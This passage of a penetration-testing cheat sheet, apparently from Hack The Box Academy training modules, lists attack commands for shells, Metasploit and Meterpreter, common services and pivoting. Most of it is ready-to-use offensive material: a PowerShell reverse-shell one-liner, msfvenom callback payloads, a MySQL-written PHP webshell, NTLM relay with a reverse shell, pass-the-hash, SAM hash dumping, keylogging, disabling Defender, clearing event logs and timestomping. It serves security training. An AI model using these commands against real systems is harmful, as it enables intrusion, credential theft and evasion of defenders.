|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|Parameters Wordlist|

### Misc

|**Command**|**Description**|
|---|---|
|`sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`|Add DNS entry|
|`for i in $(seq 1 1000); do echo $i >> ids.txt; done`|Create Sequence Wordlist|
|`curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`|curl w/ POST|


## Shells & Payloads

|**Commands**|**Description**|
|---|---|
|`xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol|
|`env`|Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use|
|`sudo nc -lvnp <port #>`|Starts a `netcat` listener on a specified port|
|`nc -nv <ip address of computer with listener started><port being listened on>`|Connects to a netcat listener at the specified IP address and port|
|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`|Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on|
|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`|`Powershell` one-liner used to connect back to a listener that has been started on an attack box|
|`Set-MpPreference -DisableRealtimeMonitoring $true`|Powershell command using to disable real time monitoring in `Windows Defender`|
|`use exploit/windows/smb/psexec`|Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`|
|`shell`|Command used in a meterpreter shell session to drop into a `system shell`|
|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`|`MSFvenom` command used to generate a linux-based reverse shell `stageless payload`|
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`|MSFvenom command used to generate a Windows-based reverse shell stageless payload|
|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`|MSFvenom command used to generate a MacOS-based reverse shell payload|
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`|MSFvenom command used to generate a ASP web reverse shell payload|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`|MSFvenom command used to generate a JSP web reverse shell payload|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`|MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload|
|`use auxiliary/scanner/smb/smb_ms17_010`|Metasploit exploit module used to check if a host is vulnerable to `ms17_010`|
|`use exploit/windows/smb/ms17_010_psexec`|Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010|
|`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`|Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`|
|`python -c 'import pty; pty.spawn("/bin/sh")'`|Python command used to spawn an `interactive shell` on a linux-based system|
|`/bin/sh -i`|Spawns an interactive shell on a linux-based system|
|`perl —e 'exec "/bin/sh";'`|Uses `perl` to spawn an interactive shell on a linux-based system|
|`ruby: exec "/bin/sh"`|Uses `ruby` to spawn an interactive shell on a linux-based system|
|`Lua: os.execute('/bin/sh')`|Uses `Lua` to spawn an interactive shell on a linux-based system|
|`awk 'BEGIN {system("/bin/sh")}'`|Uses `awk` command to spawn an interactive shell on a linux-based system|
|`find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`|Uses `find` command to spawn an interactive shell on a linux-based system|
|`find . -exec /bin/sh \; -quit`|An alternative way to use the `find` command to spawn an interactive shell on a linux-based system|
|`vim -c ':!/bin/sh'`|Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"|
|`ls -la <path/to/fileorbinary>`|Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute|
|`sudo -l`|Displays the commands that the currently logged on user can run as `sudo`|
|`/usr/share/webshells/laudanum`|Location of `laudanum webshells` on ParrotOS and Pwnbox|
|`/usr/share/nishang/Antak-WebShell`|Location of `Antak-Webshell` on Parrot OS and Pwnbox|

[Download Cheatsheet](https://academy.hackthebox.com/module/cheatsheet/115)

## Metasploit

### MSFconsole Commands

|**Command**|**Description**|
|:--|:--|
|`show exploits`|Show all exploits within the Framework.|
|`show payloads`|Show all payloads within the Framework.|
|`show auxiliary`|Show all auxiliary modules within the Framework.|
|`search <name>`|Search for exploits or modules within the Framework.|
|`info`|Load information about a specific exploit or module.|
|`use <name>`|Load an exploit or module (example: use windows/smb/psexec).|
|`use <number>`|Load an exploit by using the index number displayed after the search command.|
|`LHOST`|Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.|
|`RHOST`|The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).|
|`setg <function>`|Set a specific value globally (for example, LHOST or RHOST).|
|`show options`|Show the options available for a module or exploit.|
|`show targets`|Show the platforms supported by the exploit.|
|`set target <number>`|Specify a specific target index if you know the OS and service pack.|
|`set payload <payload>`|Specify the payload to use.|
|`set payload <number>`|Specify the payload index number to use after the show payloads command.|
|`show advanced`|Show advanced options.|
|`set autorunscript migrate -f`|Automatically migrate to a separate process upon exploit completion.|
|`check`|Determine whether a target is vulnerable to an attack.|
|`exploit`|Execute the module or exploit and attack the target.|
|`exploit -j`|Run the exploit under the context of the job. (This will run the exploit in the background.)|
|`exploit -z`|Do not interact with the session after successful exploitation.|
|`exploit -e <encoder>`|Specify the payload encoder to use (example: exploit –e shikata_ga_nai).|
|`exploit -h`|Display help for the exploit command.|
|`sessions -l`|List available sessions (used when handling multiple shells).|
|`sessions -l -v`|List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.|
|`sessions -s <script>`|Run a specific Meterpreter script on all Meterpreter live sessions.|
|`sessions -K`|Kill all live sessions.|
|`sessions -c <cmd>`|Execute a command on all live Meterpreter sessions.|
|`sessions -u <sessionID>`|Upgrade a normal Win32 shell to a Meterpreter console.|
|`db_create <name>`|Create a database to use with database-driven attacks (example: db_create autopwn).|
|`db_connect <name>`|Create and connect to a database for driven attacks (example: db_connect autopwn).|
|`db_nmap`|Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)|
|`db_destroy`|Delete the current database.|
|`db_destroy <user:password@host:port/database>`|Delete database using advanced options.|
|||

---

###  Meterpreter Commands

|**Command**|**Description**|
|:--|:--|
|`help`|Open Meterpreter usage help.|
|`run <scriptname>`|Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.|
|`sysinfo`|Show the system information on the compromised target.|
|`ls`|List the files and folders on the target.|
|`use priv`|Load the privilege extension for extended Meterpreter libraries.|
|`ps`|Show all running processes and which accounts are associated with each process.|
|`migrate <proc. id>`|Migrate to the specific process ID (PID is the target process ID gained from the ps command).|
|`use incognito`|Load incognito functions. (Used for token stealing and impersonation on a target machine.)|
|`list_tokens -u`|List available tokens on the target by user.|
|`list_tokens -g`|List available tokens on the target by group.|
|`impersonate_token <DOMAIN_NAMEUSERNAME>`|Impersonate a token available on the target.|
|`steal_token <proc. id>`|Steal the tokens available for a given process and impersonate that token.|
|`drop_token`|Stop impersonating the current token.|
|`getsystem`|Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.|
|`shell`|Drop into an interactive shell with all available tokens.|
|`execute -f <cmd.exe> -i`|Execute cmd.exe and interact with it.|
|`execute -f <cmd.exe> -i -t`|Execute cmd.exe with all available tokens.|
|`execute -f <cmd.exe> -i -H -t`|Execute cmd.exe with all available tokens and make it a hidden process.|
|`rev2self`|Revert back to the original user you used to compromise the target.|
|`reg <command>`|Interact, create, delete, query, set, and much more in the target’s registry.|
|`setdesktop <number>`|Switch to a different screen based on who is logged in.|
|`screenshot`|Take a screenshot of the target’s screen.|
|`upload <filename>`|Upload a file to the target.|
|`download <filename>`|Download a file from the target.|
|`keyscan_start`|Start sniffing keystrokes on the remote target.|
|`keyscan_dump`|Dump the remote keys captured on the target.|
|`keyscan_stop`|Stop sniffing keystrokes on the remote target.|
|`getprivs`|Get as many privileges as possible on the target.|
|`uictl enable <keyboard/mouse>`|Take control of the keyboard and/or mouse.|
|`background`|Run your current Meterpreter shell in the background.|
|`hashdump`|Dump all hashes on the target. use sniffer Load the sniffer module.|
|`sniffer_interfaces`|List the available interfaces on the target.|
|`sniffer_dump <interfaceID> pcapname`|Start sniffing on the remote target.|
|`sniffer_start <interfaceID> packet-buffer`|Start sniffing with a specific range for a packet buffer.|
|`sniffer_stats <interfaceID>`|Grab statistical information from the interface you are sniffing.|
|`sniffer_stop <interfaceID>`|Stop the sniffer.|
|`add_user <username> <password> -h <ip>`|Add a user on the remote target.|
|`add_group_user <"Domain Admins"> <username> -h <ip>`|Add a username to the Domain Administrators group on the remote target.|
|`clearev`|Clear the event log on the target machine.|
|`timestomp`|Change file attributes, such as creation date (antiforensics measure).|
|`reboot`|Reboot the target machine.|
|||


## Attacking common services

### Attacking FTP

| **Command**                                                              | **Description**                                      |
| ------------------------------------------------------------------------ | ---------------------------------------------------- |
| `ftp 192.168.2.142`                                                      | Connecting to the FTP server using the `ftp` client. |
| `nc -v 192.168.2.142 21`                                                 | Connecting to the FTP server using `netcat`.         |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service.                       |
| `medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121`               | Brute-forcing the FTP service.                       |

---

### Attacking SMB

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //10.129.14.128`|Null-session testing against the SMB service.|
|`smbmap -H 10.129.14.128`|Network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 -r notes`|Recursive network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 --download "notes\note.txt"`|Download a specific file from the shared folder.|
|`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`|Upload a specific file to the shared folder.|
|`rpcclient -U'%' 10.10.110.17`|Null-session with the `rpcclient`.|
|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automated enumeratition of the SMB service using `enum4linux-ng`.|
|`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`|Password spraying against different users from a list.|
|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to the SMB service using the `impacket-psexec`.|
|`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Execute a command over the SMB service using `crackmapexec`.|
|`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerating Logged-on users.|
|`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Extract hashes from the SAM database.|
|`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|Use the Pass-The-Hash technique to authenticate on the target host.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`|Dump the SAM database using `impacket-ntlmrelayx`.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`|Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.|

---

### Attacking SQL Databases

|**Command**|**Description**|
|---|---|
|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
|`mysql> USE htbusers;`|Select a specific database in MySQL.|
|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|

---

### Attacking RDP

|**Command**|**Description**|
|---|---|
|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|
|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|
|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|
|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|
|`net start sessionhijack`|Execute the RDP session hijack.|
|`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable "Restricted Admin Mode" on the target Windows host.|
|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|

---

### Attacking DNS

|**Command**|**Description**|
|---|---|
|`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`|Perform an AXFR zone transfer attempt against a specific name server.|
|`subfinder -d inlanefreight.com -v`|Brute-forcing subdomains.|
|`host support.inlanefreight.com`|DNS lookup for the specified subdomain.|

---

### Attacking Email Services

|**Command**|**Description**|
|---|---|
|`host -t MX microsoft.com`|DNS lookup for mail servers for the specified domain.|
|`dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`|DNS lookup for mail servers for the specified domain.|
|`host -t A mail1.inlanefreight.htb.`|DNS lookup of the IPv4 address for the specified subdomain.|
|`telnet 10.10.110.20 25`|Connect to the SMTP server.|
|`smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`|SMTP user enumeration using the RCPT command against the specified host.|
|`python3 o365spray.py --validate --domain msplaintext.xyz`|Verify the usage of Office365 for the specified domain.|
|`python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`|Enumerate existing users using Office365 on the specified domain.|
|`python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`|Password spraying against a list of users that use Office365 for the specified domain.|
|`hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`|Brute-forcing the POP3 service.|
|`swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`|Testing the SMTP service for the open-relay vulnerability.|


## Pivoting, tunneling and port forwarding


| Command                                                                                                                                                                                                            | Description                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                                                                                                                                                                                                         | Linux-based command that displays all current network configurations of a system.                                                                                                                                                                                       |
| `ipconfig`                                                                                                                                                                                                         | Windows-based command that displays all system network configurations.                                                                                                                                                                                                  |
| `netstat -r`                                                                                                                                                                                                       | Command used to display the routing table for all IPv4-based protocols.                                                                                                                                                                                                 |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                                                                                                                                                    |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306.                                                                                                                                                   |
| `netstat -antp \| grep 1234`                                                                                                                                                                                       | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` .                                                                                                                                |
| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Nmap command used to scan a host through a connection that has been made on local port `1234`.                                                                                                                                                                          |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`.                                                                                                                                               |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                              |
| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                                 |
| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`).                                          |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`).                                  |
| `proxychains msfconsole`                                                                                                                                                                                           | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                       |
| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Metasploit search that attempts to find a module called `rdp_scanner`.                                                                                                                                                                                                  |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                     |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`.    |
| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Used to select the multi-handler exploit module in Metasploit.                                                                                                                                                                                                          |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`).                                                                                                              |
| `python3 -m http.server 8123`                                                                                                                                                                                      | Uses Python3 to start a simple HTTP server listening on port `8123`. Can be used to retrieve files from a host.                                                                                                                                                         |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`                                                                                                                | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`.                                                                                                |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target.                                                                                                     |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob.                                               |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`).                                                                                                                                                        |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`                                                                                                                                       | For Loop used on a Linux-based system to discover devices in a specified network segment.                                                                                                                                                                               |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                                                                                                                                           | For Loop used on a Windows-based system to discover devices in a specified network segment.                                                                                                                                                                             |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`                                                                                                                          | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.                                                                                                                                                                                   |
| `msf6 > use auxiliary/server/socks_proxy`                                                                                                                                                                          | Metasploit command that selects the `socks_proxy` auxiliary module.                                                                                                                                                                                                     |
| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Metasploit command that lists all currently running jobs.                                                                                                                                                                                                               |
| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Metasploit command used to select the autoroute module.                                                                                                                                                                                                                 |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |
| `meterpreter > help portfwd`                                                                                                                                                                                       | Meterpreter command used to display the features of the portfwd command.                                                                                                                                                                                                |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.                                                                |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.                                                                                                          |
| `netstat -antp`                                                                                                                                                                                                    | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection.                                      |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host.                                                                                            |
| `meterpreter > bg`                                                                                                                                                                                                 | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux                                                                                                                                       |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.                                                                                                                                 |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.                                                                                                                               |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Uses apt-get to install the tool sshuttle.                                                                                                                                                                                                                              |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`).                                                                                     |
| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clones the rpivot project GitHub repository.                                                                                                                                                                                                                            |
| `sudo apt-get install python2.7`                                                                                                                                                                                   | Uses apt-get to install python2.7.                                                                                                                                                                                                                                      |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`).                                                                                                                                       |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                                                                                                                                                                |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port.                                                                                                                                                          |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.                                                                                                                                          |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                                                                                              |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Windows-based command that uses `netsh.exe` to configure a portproxy rule called `v4tov4` that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.                                                                               |
| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                                                                                                |
| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clones the `dnscat2` project GitHub repository.                                                                                                                                                                                                                         |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled.                                                                                                         |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clones the dnscat2-powershell project Github repository.                                                                                                                                                                                                                |
| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                                                                                                 |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`).                                                                        |
| `dnscat2> ?`                                                                                                                                                                                                       | Used to list dnscat2 options.                                                                                                                                                                                                                                           |
| `dnscat2> window -i 1`                                                                                                                                                                                             | Used to interact with an established dnscat2 session.                                                                                                                                                                                                                   |
| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5.                                                                                                                                                                           |
| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Used to connect to a chisel server at the specified IP address & port using socks.                                                                                                                                                                                      |
| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clones the ptunnel-ng project GitHub repository.                                                                                                                                                                                                                        |
| `sudo ./autogen.sh`                                                                                                                                                                                                | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                                                                                                                                                                                 |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`).                                                                                                                                                                 |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`).                                                                                                                                                                                    |
| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.                                                                                                                                       |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Windows-based command used to register the SocksOverRDP-PLugin.dll.                                                                                                                                                                                                     |
| `netstat -antb \|findstr 1080`                                                                                                                                                                                     | Windows-based command used to list TCP network connections listening on port 1080.                                                                                                                                                                                      |

[Download Cheatsheet](https://academy.hackthebox.com/module/cheatsheet/158)



